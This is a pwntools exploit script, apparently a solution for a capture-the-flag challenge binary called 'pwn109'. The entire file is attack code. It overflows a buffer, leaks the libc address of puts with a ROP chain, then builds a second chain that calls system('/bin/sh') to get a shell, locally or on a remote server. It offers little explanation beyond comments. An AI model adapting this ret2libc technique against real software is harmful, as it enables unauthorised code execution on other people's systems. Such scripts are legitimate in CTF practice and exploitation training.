from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './pwn109.pwn109'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = elf.libc

# Start program
io = start()

offset = 40
pop_rdi = 0x00000000004012a3 # pop rdi; ret;
movaps = 0x000000000040101a # ret;

# Build payload for puts plt leak address
payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    ]
})

io.recvuntil('Go ahead')
io.recvline()
io.sendline(payload)

# libc addresses are often only 6 bytes long, meaning they are preceded with 0x0000
# but this won't be read as it's a null byte, so only read 6 bytes and append the null ones later
got_puts = u64(io.recv(6) + b'\x00\x00')
info("Puts leaked address %#x", got_puts)

# Update libc address
libc.address = got_puts - libc.symbols['puts']
info("Libc address %#x", libc.address)

system = libc.symbols['puts'] - 0x31550
sh = libc.symbols['puts'] + 0x13337a
info("Libc system address %#x", libc.symbols['system'])
info("Libc /bin/sh address %#x", sh)


payload = flat({
    offset: [
        pop_rdi,
        sh,
        movaps,
        system
    ]
})

# Send the payload
io.sendline(payload)

io.interactive()